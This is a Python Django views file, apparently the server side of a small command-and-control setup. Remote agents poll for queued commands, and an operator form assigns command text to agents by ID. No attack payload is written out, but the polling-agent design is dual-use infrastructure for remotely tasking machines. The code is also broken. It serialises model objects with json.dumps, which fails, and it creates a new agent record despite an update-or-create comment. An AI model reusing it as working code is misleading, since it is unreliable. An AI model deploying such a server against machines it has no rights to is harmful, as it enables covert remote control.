from django.http import HttpResponse
from django.shortcuts import render
from command.models import Agent, Command
from command.forms import CommandForm
import json

from django.utils import timezone


def pull_commands(request) -> HttpResponse:
    ##
    # Update agent's last_heard and host if seen before
    # if not seen before, create the new agent
    agent_id = request.GET["agent_id"]
    agent = Agent()
    agent.agent_id = agent_id
    agent.last_heard = timezone.now()
    agent.host = get_client_ip(request)
    agent.save()

    ##
    # Fetch all commands for this agent to run
    cmds = list(Command.objects.filter(agent_id=agent_id))
    
    return HttpResponse(json.dumps(cmds))


def index(request) -> HttpResponse:

    if request.method == "POST":
        form = CommandForm(request.POST)
        if form.is_valid():
            new_cmd = Command()
            new_cmd.cmd_txt = form.cleaned_data.get("cmd_txt")
            new_cmd.agent_id = form.cleaned_data.get("agent_id")
            new_cmd.save()

    context = {
        "agents": list(Agent.objects.all()),
        "form": CommandForm(),
        "commands": list(Command.objects.all())
    }


    return render(request=request, template_name="command/index.html", context=context)

def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip
